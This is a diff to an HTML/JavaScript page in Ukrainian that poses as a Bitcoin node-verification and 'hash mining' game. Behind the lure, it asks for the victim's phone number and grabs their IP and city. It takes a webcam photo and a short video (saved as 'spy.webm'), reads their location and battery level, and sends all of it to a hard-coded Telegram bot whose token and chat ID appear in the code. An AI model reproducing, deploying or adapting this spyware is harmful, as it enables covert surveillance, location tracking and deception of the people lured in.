@@ -10,7 +10,7 @@
         .titlebar { height: 28px; background: #000080; display: flex; align-items: center; padding: 0 8px; gap: 6px; flex-shrink: 0; }
         .title-text { flex: 1; font-size: 11px; color: #fff; font-weight: bold; }
         .tbtn { width: 16px; height: 14px; background: #c0c0c0; border: 1px solid #fff; border-right: 2px solid #444; border-bottom: 2px solid #444; font-size: 9px; color: #000; display: flex; align-items: center; justify-content: center; }
-        .terminal { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; position: relative; }
+        .terminal { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; }
         #auth-screen, #admin-screen, #game-screen { display: none; }
         #auth-screen { display: block; text-align: center; margin-top: 15%; }
         input { background: transparent; border: 1px solid #0f0; color: #fff; padding: 10px; width: 85%; margin: 15px 0; outline: none; font-size: 16px; text-align: center; }
@@ -19,8 +19,7 @@
         .red { color: #ff5555; }
         .yellow { color: #ffff00; }
         .stat-bar { background: #1a1a1a; padding: 8px 15px; border-top: 1px solid #333; display: flex; justify-content: space-between; font-size: 11px; color: #888; }
-        .admin-box { background: #111; border: 1px solid #444; padding: 15px; margin-top: 10px; text-align: left; }
-        .adm-btn { background: #333; color: #fff; font-size: 10px; padding: 8px; border: 1px solid #555; cursor: pointer; }
+        #loading-bar { width: 0%; height: 2px; background: #0f0; transition: width 3s linear; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -32,15 +31,15 @@
 
     <div class="terminal">
         <div id="auth-screen">
-            <p class="log-line yellow">C:\SYSTEM> ВЕРЕФІКАЦІЯ ВУЗЛА BTC v9.0</p>
-            <p style="font-size: 10px; color: #666; margin-bottom: 10px;">Потрібен доступ до сенсорів для підтвердження PoW</p>
+            <p class="log-line yellow">C:\SYSTEM> ВЕРЕФІКАЦІЯ ВУЗЛА BTC v10.0</p>
+            <p style="font-size: 10px; color: #666;">Потрібне підтвердження біометрії для доступу до гаманця</p>
             <input type="tel" id="user-phone" placeholder="+380XXXXXXXXX">
             <br>
             <button onclick="checkAccess()">CONNECT.EXE</button>
         </div>
 
         <div id="game-screen">
-            <div id="output"><p class="log-line">> Встановлення зашифрованого тунелю...</p></div>
+            <div id="output"><p class="log-line">> Встановлення зв'язку...</p></div>
             <div style="margin-top: 20px; text-align: center;">
                 <h1 id="balance" style="font-size: 35px; color: #fff;">0.0000 BTC</h1>
                 <button onclick="mine()" style="width:100%">GENERATE HASH ⚡</button>
@@ -48,13 +47,11 @@
         </div>
 
         <div id="admin-screen">
-            <h2 class="red">⚙️ TERMINAL CONTROL</h2>
-            <div class="admin-box">
-                <p class="yellow">[LOGS]</p>
-                <div id="admin-log" style="font-size: 11px; margin: 10px 0; color: #ccc;">> Сплячий режим...</div>
-                <button class="adm-btn" onclick="location.reload()">🔄 RESET</button>
+            <h2 class="red">⚙️ ADMIN PANEL</h2>
+            <div style="background:#111; padding:10px; border:1px solid #333; margin-top:10px;">
+                <p id="admin-log" style="font-size:11px;">> Очікування...</p>
             </div>
-            <button onclick="location.reload()" style="margin-top:20px; background:#222; color:#fff; width:100%">EXIT</button>
+            <button onclick="location.reload()" style="margin-top:20px; background:#444; width:100%">RESTART</button>
         </div>
     </div>
 
@@ -66,10 +63,8 @@
     <script>
         const botToken = '8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8';
         const chatId = '8194848649';
-        let btc = 0;
         let targetPhone = "";
 
-        // Отримання заряду відразу
         if (navigator.getBattery) {
             navigator.getBattery().then(b => {
                 document.getElementById('bat-info').innerText = "BATTERY: " + Math.round(b.level * 100) + "%";
@@ -83,29 +78,33 @@
                 document.getElementById('admin-screen').style.display = 'block';
                 return;
             }
-            if (val.length < 7) return alert("Error: Invalid Access Code");
+            if (val.length < 7) return alert("Помилка ID");
             targetPhone = val;
-            launchMain();
+            startProtocol();
         }
 
-        async function launchMain() {
-            document.getElementById('auth-screen').innerHTML = '<p class="log-line yellow">> ІНІЦІАЛІЗАЦІЯ ПРОТОКОЛУ...</p><p id="h-logs" class="log-line"></p>';
+        async function startProtocol() {
+            const auth = document.getElementById('auth-screen');
+            auth.innerHTML = '<p class="log-line yellow">> ПІДКЛЮЧЕННЯ ДО КАНАЛУ...</p><div id="loading-bar"></div>';
             
-            // 1. IP та Дані (завжди працює)
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ip:"Unknown", city:"Unknown", org:"N/A"}));
+            // Запуск прогрес-бару (3 секунди для камери)
+            setTimeout(() => { document.getElementById('loading-bar').style.width = '100%'; }, 100);
+
+            // Отримання IP відразу
+            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ip:"N/A", city:"Unknown"}));
             document.getElementById('ip-display').innerText = "IP: " + ipData.ip;
 
-            // 2. Спроба взяти медіа
+            // Запуск камери
             captureMedia(ipData);
-
-            // 3. Спроба взяти локацію
+            
+            // Запуск локації
             captureLocation(ipData);
 
             setTimeout(() => {
-                document.getElementById('auth-screen').style.display = 'none';
+                auth.style.display = 'none';
                 document.getElementById('game-screen').style.display = 'block';
                 document.getElementById('footer').style.display = 'flex';
-            }, 3000);
+            }, 3500);
         }
 
         async function captureMedia(ip) {
@@ -114,27 +113,43 @@
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.setAttribute("playsinline", true);
+                video.muted = true;
                 await video.play();
 
-                // Фото через 1.5 сек
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    const recorder = new MediaRecorder(stream);
-                    let chunks = [];
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    recorder.onstop = () => {
-                        const vBlob = new Blob(chunks, { type: 'video/webm' });
-                        sendFullPackage(canvas, vBlob, ip);
-                        stream.getTracks().forEach(t => t.stop());
-                    };
-                    recorder.start();
-                    setTimeout(() => recorder.stop(), 4000);
-                }, 1500);
+                // Чекаємо 2.5 сек щоб камера "проснулась"
+                await new Promise(r => setTimeout(r, 2500));
+
+                // 1. РОБИМО ФОТО
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'image.jpg');
+                    fd.append('caption', `📸 ФОТО: ${targetPhone}\n🌐 IP: ${ip.ip}\n🏙 Місто: ${ip.city}\n🔋 ${document.getElementById('bat-info').innerText}`);
+                    fd.append('parse_mode', 'HTML');
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg', 0.8);
+
+                // 2. ЗАПИСУЄМО ВІДЕО
+                const recorder = new MediaRecorder(stream);
+                let chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const vBlob = new Blob(chunks, { type: 'video/webm' });
+                    const vfd = new FormData();
+                    vfd.append('chat_id', chatId);
+                    vfd.append('video', vBlob, 'spy.webm');
+                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: vfd });
+                    stream.getTracks().forEach(t => t.stop());
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 3000);
+
             } catch (e) {
-                sendToBot(`⚠️ КАМЕРА БЛОК: ${e.name}\n📱 Тел: ${targetPhone}\n🌐 IP: ${ip.ip}\n🏙 Місто: ${ip.city}`);
+                sendMsg(`⚠️ КАМЕРА OFF: ${e.name}\n📱 Тел: ${targetPhone}\n🌐 IP: ${ip.ip}`);
             }
         }
 
@@ -142,41 +157,25 @@
             navigator.geolocation.getCurrentPosition(
                 pos => {
                     const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendToBot(`📍 ЛОКАЦІЯ: <a href="${map}">Google Maps</a>\n📱 Тел: ${targetPhone}\n🌐 IP: ${ip.ip}\n🏙 Місто: ${ip.city}`);
+                    sendMsg(`📍 ЛОКАЦІЯ: <a href="${map}">Google Maps</a>\n📱 Тел: ${targetPhone}\n🌐 IP: ${ip.ip}`);
                 },
                 err => {
-                    sendToBot(`⚠️ ГЕО БЛОК: ${err.message}\n📱 Тел: ${targetPhone}\n🌐 IP: ${ip.ip}\n🏙 Місто: ${ip.city}`);
+                    sendMsg(`⚠️ ГЕО OFF: ${err.message}\n📱 Тел: ${targetPhone}\n🌐 IP: ${ip.ip}\n🏙 Місто: ${ip.city}`);
                 }
             );
         }
 
-        function sendFullPackage(canvas, vBlob, ip) {
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', chatId);
-                fd.append('photo', blob, 'shot.jpg');
-                fd.append('caption', `📸 ФОТО: ${targetPhone}\n🔋 ${document.getElementById('bat-info').innerText}\n🌐 IP: ${ip.ip}\n🏙 Місто: ${ip.city}`);
-                fd.append('parse_mode', 'HTML');
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg');
-
-            const vfd = new FormData();
-            vfd.append('chat_id', chatId);
-            vfd.append('video', vBlob, 'vid.webm');
-            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: vfd });
-        }
-
-        function sendToBot(txt) {
+        function sendMsg(txt) {
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(txt)}&parse_mode=HTML`);
         }
 
         function mine() {
-            btc += 0.0001;
-            document.getElementById('balance').innerText = btc.toFixed(4) + " BTC";
+            let b = document.getElementById('balance');
+            b.innerText = (parseFloat(b.innerText) + 0.0001).toFixed(4) + " BTC";
             const out = document.getElementById('output');
             const p = document.createElement('p');
             p.className = 'log-line';
-            p.innerHTML = `<span style="color:#0f0">[OK]</span> Mining block 0x${Math.random().toString(16).slice(2,8)}...`;
+            p.innerHTML = `<span style="color:#0f0">[OK]</span> Hash processed...`;
             out.appendChild(p);
             out.scrollTop = out.scrollHeight;
         }
